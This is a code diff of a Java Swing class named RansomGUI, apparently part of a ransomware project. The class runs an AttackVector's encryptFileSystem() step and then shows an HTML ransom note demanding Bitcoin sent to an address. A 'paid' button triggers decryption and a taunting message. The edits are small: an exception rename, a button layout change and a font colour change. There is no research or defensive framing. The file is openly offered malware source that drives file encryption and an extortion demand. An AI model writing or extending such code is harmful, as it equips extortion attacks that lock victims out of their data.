@@ -13,14 +13,15 @@ import javax.swing.JPanel;
 
 import Agent.Attack.AttackVector;
 import Agent.exceptions.AttackVectorException;
+import Agent.exceptions.RansomwareException;
 
 public class RansomGUI extends JFrame implements ActionListener {
 
+	private static final long serialVersionUID = -486811144121647925L;
 	private JPanel panel;
 	private JLabel label;
 	private JButton paidButton;
 	private AttackVector ransomProcess;
-	private static final long serialVersionUID = -486811144121647925L;
 
 	public RansomGUI() {
 		label = new JLabel();
@@ -34,13 +35,13 @@ public class RansomGUI extends JFrame implements ActionListener {
 		ransomProcess = new AttackVector();
 	}
 
-	public void start() throws AttackVectorException {
-		
+	public void start() throws RansomwareException {
+
 		try {
 			ransomProcess.encryptFileSystem();
 			encryptionScreen();
 		} catch (AttackVectorException e) {
-			throw new AttackVectorException("encryption failed", e.getCause());
+			throw new RansomwareException("Process failed", e.getCause());
 		}
 	}
 
@@ -75,7 +76,7 @@ public class RansomGUI extends JFrame implements ActionListener {
 				+ "			worth of Bitcoin to this adress: <br /> 1sf5hh454e5eyxvfdv\r\n" + "		</font>\r\n"
 				+ "	</p>\r\n" + "\r\n" + "	<form\r\n \n\n</html>");
 		panel.add(label);
-		panel.add(paidButton, BorderLayout.CENTER);
+		panel.add(paidButton, BorderLayout.PAGE_END);
 		paidButton.addActionListener(this);
 	}
 
@@ -96,7 +97,7 @@ public class RansomGUI extends JFrame implements ActionListener {
 				+ "<h1 align=\"center\" ><font size=\"20\" color=\"red\" face=\"Showcard Gothic\">AS WE PROMISED ,<br /> YOUR FILES ARE NOW DECRYPTED !</font></h1>\r\n"
 				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n"
 				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n"
-				+ "<h6 align=\"LEFT\" ><font size=\"0.2\" color=\"yellow\" face=\"verdana\">have fun....for now..</font></h6>\r\n"
+				+ "<h6 align=\"LEFT\" ><font size=\"0.2\" color=\"red\" face=\"verdana\">have fun....for now..</font></h6>\r\n"
 				+ "</body>\r\n </html>");
 		panel.add(label);
 	}
@@ -114,8 +115,8 @@ public class RansomGUI extends JFrame implements ActionListener {
 	public void actionPerformed(ActionEvent ex) {
 		panel.remove(paidButton);
 		waitScreen();
-		try {
 
+		try {
 			ransomProcess.decryptFileSystem();
 			decryptionScreen();
 
